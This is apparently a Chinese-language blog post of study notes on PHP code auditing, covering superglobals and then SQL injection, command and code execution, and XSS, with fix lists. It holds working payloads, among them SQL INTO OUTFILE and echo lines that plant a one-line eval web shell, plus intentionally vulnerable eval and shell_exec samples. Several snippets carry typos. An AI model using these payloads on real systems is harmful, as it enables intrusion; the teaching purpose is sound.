<p>错误报告级别  error_reporting = E_ALL &amp; ~E_NOTICE    (最高级别)</p>
<h3 id="代码调试小技巧"><a href="#代码调试小技巧" class="headerlink" title="代码调试小技巧"></a>代码调试小技巧</h3><p>print_r($var)</p>
<p>var_dump($var)    详细、数据类型、长度</p>
<p>debug_zval_dump  比print_r多一个调用次数</p>
<p>debug_print_backtrace();显示函数调用栈的信息</p>
<p>exit();当断点用好了</p>
<p>Xdebug，调试php代码的工具</p>
<p>配置</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563197438631.png" alt="1563197438631"></p>
<h3 id="全局变量和超全局变量"><a href="#全局变量和超全局变量" class="headerlink" title="全局变量和超全局变量"></a>全局变量和超全局变量</h3><p>全局变量：全局变量在函数外定义，作用于不到函数内，函数内一用，global $a;</p>
<p>超全局变量：所有脚本有效，$_GET,$_POST,$_SERVER,$_COOKIE,其他的存在$GLOBALS数组中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST	$_ENV	$_SESSION	$_FILES</span><br></pre></td></tr></table></figure>

<p>globals $name;    参数传递的作用</p>
<p>$GLOBALS[‘name’] =  123    变量的作用域设置的全局</p>
<p>$_REQUEST = POST or GET</p>
<p>$_SERVER     保存关于报头、路径和脚本位置的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;HTTP_HOST&apos;]  请求头信息中的Host内容，获取当前域名。</span><br><span class="line">$_SERVER[&quot;SERVER_NAME&quot;]  输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同，但如果服务器端口不是默认的80端口，或者协议规范不是HTTP/1.1时，HTTP_HOST会包含这些信息，而SERVER_NAME不一定包含。（主要看配置文件的设置）。</span><br><span class="line">$_SERVER[&quot;HTTP_USER_AGENT&quot;]  获取用户相关信息，包括用户浏览器、操作系统等信息。</span><br><span class="line">$_SERVER[&apos;HTTP_ACCEPT&apos;]  当前请求的ACCEPT头部信息。</span><br><span class="line">$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;]  这个值是由浏览器发送，表明用户默认的语言设置，后面的q值表示用户对该语言的喜好程度。</span><br><span class="line">$_SERVER[&quot;HTTP_ACCEPT_ENCODING&quot;]  大部分的现代浏览器都支持gzip压缩，并会把这一信息报告给服务器。这时服务器就会压缩过的HTML发送给浏览器。这可以减少近80%的文件大小，以节省下载时间和带宽。</span><br><span class="line">$_SERVER[&quot;HTTP_COOKIE&quot;]  浏览器的cookie信息。</span><br><span class="line">$_SERVER[&quot;HTTP_CONNECTION&quot;]  当前请求的连接情况。</span><br><span class="line">$_SERVER[&quot;HTTP_UPGRADE_INSECURE_REQUESTS&quot;]  表示浏览器可读懂服务器发过来的请求，</span><br><span class="line">$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]  表示浏览器是否会缓存这个页面信息。</span><br><span class="line">$_SERVER[&quot;PATH&quot;]  当前脚本所在文件系统。</span><br><span class="line">$_SERVER[&quot;SystemRoot&quot;]  当前服务器的操作系统。</span><br><span class="line">$_SERVER[&quot;COMSPEC&quot;]  指向cmd.exe的路径。</span><br><span class="line">$_SERVER[&quot;PATHEXT&quot;]  环境变量设置。</span><br><span class="line">$_SERVER[&quot;WINDIR&quot;]  脚本指向的系统目录。</span><br><span class="line">$_SERVER[&quot;SERVER_SIGNATURE&quot;]  包含服务器版本和虚拟主机名的字符串。</span><br><span class="line">$_SERVER[&quot;SERVER_SOFTWARE&quot;]  服务器软件配置信息。</span><br><span class="line">$_SERVER[&quot;SERVER_ADDR&quot;]  当前运行脚本的服务器的ip地址。</span><br><span class="line">$_SERVER[&quot;SERVER_PORT&quot;]  服务器端口。</span><br><span class="line">$_SERVER[&quot;REMOTE_ADDR&quot;]  浏览网页的用户ip。//可以赋值以修改、伪造</span><br><span class="line">$_SERVER[&quot;DOCUMENT_ROOT&quot;]  当前运行脚本所在的根目录。</span><br><span class="line">$_SERVER[&quot;REQUEST_SCHEME&quot;]  服务器通信协议，是http或https。</span><br><span class="line">$_SERVER[&quot;CONTEXT_PREFIX&quot;]  前缀。</span><br><span class="line">$_SERVER[&quot;CONTEXT_DOCUMENT_ROOT&quot;]  当前脚本所在的文档根目录。</span><br><span class="line">$_SERVER[&quot;SERVER_ADMIN&quot;]  服务器管理员信息。</span><br><span class="line">$_SERVER[&quot;SCRIPT_FILENAME&quot;]  当前执行脚本的绝对路径。</span><br><span class="line">$_SERVER [&quot;REMOTE_PORT&quot;]  用户连接到服务器时所使用的端口。</span><br><span class="line">$_SERVER[&quot;GATEWAY_INTERFACE&quot;]  服务器使用的CGI规范的版本。</span><br><span class="line">$_SERVER[&quot;SERVER_PROTOCOL&quot;]  请求页面时通信协议的名称和版本。</span><br><span class="line">$_SERVER[&quot;REQUEST_METHOD&quot;]  请求提交数据的方式。</span><br><span class="line">$_SERVER[&quot;QUERY_STRING&quot;]  服务器请求时？后面的参数。</span><br><span class="line">$_SERVER[&quot;REQUEST_URI&quot;]  当前脚本路径，根目录之后的目录。</span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;]  当前脚本的路径。这在页面需要指向自己时非常有用。</span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]  当前正在执行脚本的文件名。</span><br><span class="line">$_SERVER[&quot;REQUEST_TIME&quot;]  得到请求开始时的时间戳。</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER)；</span><br></pre></td></tr></table></figure>

<p>$_FILES    文件上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$_FILES数组内容如下: </span><br><span class="line">$_FILES[&apos;myFile&apos;][&apos;name&apos;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&apos;myFile&apos;][&apos;type&apos;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&apos;myFile&apos;][&apos;size&apos;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&apos;myFile&apos;][&apos;tmp_name&apos;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&apos;myFile&apos;][&apos;error&apos;] 和该文件上传相关的错误代码。[&apos;error&apos;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD_ERR_OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line">UPLOAD_ERR_INI_SIZE </span><br><span class="line">值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 </span><br><span class="line">UPLOAD_ERR_FORM_SIZE </span><br><span class="line">值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 </span><br><span class="line">UPLOAD_ERR_PARTIAL </span><br><span class="line">值：3; 文件只有部分被上传。 </span><br><span class="line">UPLOAD_ERR_NO_FILE </span><br><span class="line">值：4; 没有文件被上传。 </span><br><span class="line">值：5; 上传文件大小为0. </span><br><span class="line"></span><br><span class="line">文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</span><br><span class="line">var_dump($_FILES)；</span><br></pre></td></tr></table></figure>

<p>表单：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span> =<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span> =<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">'file'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_SESSTION 当前脚本可用SESTION变量的数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sesstion_start();</span><br><span class="line">$test = <span class="number">123</span>;</span><br><span class="line">$_SESSTION[<span class="string">'value'</span>]=$test;</span><br><span class="line"><span class="keyword">echo</span> $_SESSTION[<span class="string">'value'</span>];</span><br><span class="line">sesstion_destory();</span><br></pre></td></tr></table></figure>

<p>$_COOKIE 通过HTTP Cookies 方式传递给当前脚本的变量的数组    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookie = $_COOKIE[<span class="number">0</span>][<span class="string">'usename'</span>] = <span class="string">"name"</span>;</span><br><span class="line">var_dump ($_COOKIE);</span><br></pre></td></tr></table></figure>

<p>COOKIE or SESSTION</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">两个都可以用来存私密的东西，同样也都有有效期的说法。</span><br><span class="line">区别在于。</span><br><span class="line">session是放在服务器上的，过期与否取决于服务期的设定，cookie是存在客户端的，过去与否可以在cookie生成的时候设置进去。</span><br><span class="line">1、cookie数据存放在客户的浏览器上，</span><br><span class="line">session数据放在服务器上</span><br><span class="line">2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗</span><br><span class="line">考虑到安全应当使用session</span><br><span class="line">3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能</span><br><span class="line">考虑到减轻服务器性能方面，应当使用COOKIE</span><br><span class="line">4、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能3K。</span><br><span class="line">5、300个的限制我没听说</span><br><span class="line">6、所以个人建议：</span><br><span class="line">将登陆信息等重要信息存放为SESSION</span><br><span class="line">其他信息如果需要保留，可以放在COOKIE中</span><br></pre></td></tr></table></figure>

<p>$_ENV    包含服务器端环境变量的数组、可在PHP程序的任何地方直接访问，只是被动的接受服务器端的环境变量转换为数组元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境变量（environment variables）一般是指在操作系统中用来指定操作系统运行环境的一些参数，如：临时文件夹位置和系统文件夹位置等</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>mysql_query() 函数执行一条 MySQL 查询。</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563251980990.png" alt="1563251980990"></p>
<p>数字型注入    当输入的参数为整型，ID、年龄、页码，不需要单引号闭合</p>
<p>字符型注入    参数为字符串时，需要单引号闭合</p>
<p>查询数据</p>
<p>读写文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 UNION SELECT 1,2,3,&lt;?php @eval[$_POST[&apos;a&apos;]];?&gt;(16进制) into outfile E:/Local/WWW/3.php&apos;--+</span><br></pre></td></tr></table></figure>

<p>然后菜刀，127.0.0.1/3.php    a</p>
<p>执行命令</p>
<p>盲注</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>报错盲注</p>
<p>HTTP头注入</p>
<p>修复方案：</p>
<p>使用预编译语句</p>
<p>使用存储过程</p>
<p>检查数据类型</p>
<p>使用安全函数</p>
<h3 id="宽字节注入、二次注入（扫描不出来）"><a href="#宽字节注入、二次注入（扫描不出来）" class="headerlink" title="宽字节注入、二次注入（扫描不出来）"></a>宽字节注入、二次注入（扫描不出来）</h3><p>addslashes()给‘加上\转义</p>
<p>逃逸单引号-&gt;加一个%df</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&apos;===&gt;%df%27 ==&gt;(addslashes)===&gt;%df%5c%27===&gt;(GBK)===&gt;運&apos;</span><br></pre></td></tr></table></figure>

<p>修复方案，</p>
<p>使用mysql_set_charset(GBK)指定字符集</p>
<p>使用mysql_real_escape_string进行转义</p>
<p>二次注入：注入点因为经过过滤处理，无法触发SQL注入漏洞，比如addslashes函数，将单引号转义，但是存进数据库后又被还原，在这种情况下，如果发现一个新的注入同时应用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入</p>
<p>先存进去，再查询，被转义的字符在存入数据库时转义消除，再查询，利用数据库中已经被存进去并且不存在转义的代码二次查询。</p>
<p>漏洞存在于先注册、留言板（写入脏数据）再查询、update（利用脏数据）系统</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>eval 将字符串 转化成代码，</p>
<p>思路：用户能够控制函数的输入，存在可执行代码的危险函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见危险函数：</span><br><span class="line">eval函数	assert函数	</span><br><span class="line">动态函数执行</span><br><span class="line">preg_replace函数	</span><br><span class="line">回调函数</span><br><span class="line">写入文件+包含文件</span><br></pre></td></tr></table></figure>

<p>回调函数</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563259300240.png" alt="1563259300240"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $b = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">eval</span>($b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(funtion: <span class="string">'callBack'</span>,$b);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">"phpinfo()"</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$b);	<span class="comment">//第一个参数用于回调，传入危险函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;a = <span class="keyword">eval</span> <span class="keyword">or</span> assert</span><br></pre></td></tr></table></figure>

<p>动态函数执行</p>
<p>1.定义一个函数</p>
<p>2.将函数名（字符串）赋值给一个变量</p>
<p>3.使用变量名代替函数名 动态调用函数    //php的函数可由字符串拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">'A'</span>]($_GET[<span class="string">'B'</span>])；</span><br><span class="line"></span><br><span class="line">&gt;&gt;A=assert&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>

<p>preg_match_all(/$str1/,$str2,$str3)        str1为标准    str2为待匹配    str3为用于存入匹配字符的数组</p>
<p>正则表达式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正则表达语法规则</span><br><span class="line">限定符</span><br><span class="line">边界限制符</span><br><span class="line">后向引用</span><br><span class="line">普通字符作为原子	</span><br><span class="line">特殊符号作为原子	注意转义</span><br><span class="line">通用字符类型作为原子</span><br><span class="line">自定义原子表作为原子</span><br></pre></td></tr></table></figure>

<p>通用字符</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563260759584.png" alt="1563260759584"></p>
<p>自定义原子</p>
<p>$pattern1 = ‘/[aj]sp’    //匹配asp or jsp</p>
<p>限定符</p>
<p>‘/go=gle/‘            匹配前面（’o‘）出现的原子次数0次或1次或多次    </p>
<p>‘/go+gle/‘            匹配前面（’o‘）出现的原子次数1次或多次    </p>
<p>/go?gle/                匹配前面（’o‘）出现的原子次数0次或1次    </p>
<p>边界限定符</p>
<p>‘/^abc/‘            以abc开头</p>
<p>‘/abc$/‘            以abc结尾</p>
<p>‘/^abc$/‘            只匹配abc</p>
<p>反向引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;/\d&#123;4&#125;(-)\d&#123;2&#125;\\1\d&#123;2&#125;/&apos;;		\d数字，&#123;4&#125;；4个；\\1，代表第一个括号的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace（$pattern,$replacement,subject）</span><br><span class="line">pattern 	正则匹配的内容	</span><br><span class="line">replacement		用于替换的内容</span><br><span class="line">subject		要进行搜索和替换的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">第一个参数</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">$str = &apos;&lt;php&gt;phpinfo()&lt;/php&gt;&apos;;</span><br><span class="line">preg_replace(&quot;/&lt;php&gt;(.*?)$cmd&quot;,&quot;\\1&quot;,$str1)</span><br><span class="line"></span><br><span class="line">&gt;&gt;cmd = &lt;\/php&gt;/e			#	(.*?)-&gt;任意字符		/e模式下执行replacement代码</span><br><span class="line"></span><br><span class="line">第二个参数</span><br><span class="line">preg_replace(&quot;/php/e&quot;,$_GET[&apos;cmd&apos;],’php‘);			#执行cmd内容</span><br><span class="line">&gt;&gt;cmd = cat /flag				#大概是永远不会出现</span><br><span class="line"></span><br><span class="line">第三个参数</span><br><span class="line">$str = $_GET[&apos;cmd&apos;];</span><br><span class="line">preg_replace(&quot;/\[php\](.*?)\[\/php\]/e&quot;,\\1,$str)</span><br><span class="line"></span><br><span class="line">思路：让cmd传过来的值与pattern相匹配，执行replacement</span><br><span class="line"></span><br><span class="line">&gt;&gt;[php]cat /flag[/php]</span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<p>尽量不要执行外部的应用程序或命令            #不用/e</p>
<p>使用自定义函数或函数库来替代外部应用程序或命令的功能</p>
<p>使用escappeshellarg函数来处理命令的函数        #用户出来的参数都是有害的</p>
<p>使用safe_mode_exec_dir来制定可执行的文件路径</p>
<p>将执行函数的参数做白名单限制，在代码或配置文件中限制某些参数    #禁止使用某些函数（源代码也不能使用）</p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>输入验证不足导致。其目标是通过易受攻击的应用程序在主机操作系统上执行任意命令</p>
<p>挖掘思路，</p>
<p>用户能够控制函数输入</p>
<p>存在可执行代码的危险函数</p>
<p>代码执行：执行的效果完全受限于语言本身</p>
<p>命令执行：不受限于语言与法本身，不受命令限制</p>
<p>命令执行的类型</p>
<p>代码层过滤不严</p>
<p>系统的漏洞造成命令注入</p>
<p>调用的第三方组件存在代码执行漏洞</p>
<p>常见的危险函数</p>
<p>string system(string $command[,int return_var])        </p>
<p>cmd = echo 111&gt;1.txt  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = echo &lt;?php @eval[$_POST[&apos;a&apos;]];?&gt;	&gt; 1.php	   [菜刀]</span><br></pre></td></tr></table></figure>

<p>passthru</p>
<p>//这两个函数有回显</p>
<p>学习windows 系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string exec（string $command[,array $output[,int $return_var]]）</span><br></pre></td></tr></table></figure>

<p>输出填充output数组</p>
<p>状态写入return_var变量</p>
<p>这个函数无回显，echo 也只回显一行</p>
<p>string shell_exec(string $cmd)</p>
<p>无回显，echo回显所有</p>
<p>cmd = dir &gt; 4.txt      将内容写入文件</p>
<p>反引号（`） 等于shell_exec()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = $_GET[&apos;cmd&apos;];		&lt;&lt; cmd=ipconfig</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo shell_exec($cmd);</span><br></pre></td></tr></table></figure>

<p>过滤函数</p>
<p>escapeshellcmd ( string <code>$command</code> ) : string        过滤整条命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 &apos; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cmd = escapeshellcmd($_GET[&apos;cmd&apos;]);		&lt;&lt; cmd=echo 5555 &gt; 5.txt   &gt;&gt;  5555   5.txt</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">echo shell_exec($cmd);</span><br></pre></td></tr></table></figure>

<p>Escapeshellarg()    过滤参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于单个单引号, escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义:</span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">尽量少用执行命令的函数，或者直接禁用，参数值尽量使用引号包括</span><br><span class="line"></span><br><span class="line">在使用动态函数之前，确保使用的函数式指定的函数之一	（白名单）</span><br><span class="line"></span><br><span class="line">在进入执行命令的函数，方法前，对参数进行过滤，对敏感字符进行转义</span><br><span class="line"></span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数过滤；对于可控点是程序参数值得情况下，使用escapeshellarg函数进行过滤</span><br><span class="line"></span><br><span class="line">参数的值尽量使用引号包裹，并且在拼接前用addslashes进行转义</span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><p>跨站脚本攻击，攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份惊醒某种动作或者对访问者进行病毒侵害的一种攻击方式</p>
<p>蠕虫、盗取cookie、跳转钓鱼网页、查看网页浏览信息</p>
<p>挖掘思路：没有过滤参数，传入到输出函数中</p>
<p>漏洞思路：搜索内容、发表文章、留言、评论回复、资料设置</p>
<p>漏洞类型：反射型；存储型；DOM型</p>
<p><img src="/2019/07/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/1563282310170.png" alt="1563282310170"></p>
<p>常见场景：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//直接输出到浏览器页面	</span></span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//直接输出到HTML标签</span></span><br><span class="line">&lt;input type = <span class="string">'text'</span> value=<span class="string">"&lt;?php echo $content?&gt;"</span>&gt;</span><br><span class="line">    <span class="comment">//直接输出到&lt;script&gt;标签</span></span><br><span class="line"> 	$content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> xss = <span class="string">'&lt;?phpe cho $content ?&gt;'</span>;</span><br><span class="line">	document.write(xss);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

